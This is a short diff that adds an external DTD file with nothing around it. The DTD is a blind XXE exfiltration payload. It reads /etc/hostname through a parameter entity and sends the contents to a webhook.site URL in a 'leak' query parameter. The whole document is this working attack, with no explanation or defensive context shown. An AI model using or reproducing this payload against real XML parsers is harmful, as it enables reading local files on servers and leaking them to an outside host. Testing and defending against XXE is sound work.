@@ -1,0 +1,4 @@
+<!ENTITY % file1 SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'https://webhook.site/0b219ddb-cded-4350-b32e-e1eafb68b923?tag=c1&leak=%file1;'>">
+%eval;
+%send;
